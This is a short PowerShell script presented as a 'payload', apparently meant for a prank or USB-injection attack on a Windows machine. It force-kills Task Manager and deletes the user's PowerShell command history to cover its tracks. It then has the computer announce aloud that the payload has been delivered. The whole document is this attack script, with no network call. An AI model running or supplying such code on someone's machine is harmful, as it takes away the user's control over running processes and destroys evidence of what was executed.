# Kill Task Manager 
taskkill /F /IM taskmgr.exe
# Create a new File ( ToDo )
$file = "$env:temp/run.tmp";

# Remove PowerShell Command History 
Remove-Item -Path "$env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

# Start a TTS Instance 
Add-Type -AssemblyName System.speech
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer


# Speak Some Crap 
$speak.Speak("Pay Load Has Been Delivered Master.");

# Remove new File ( ToDo )
del $file;
exit
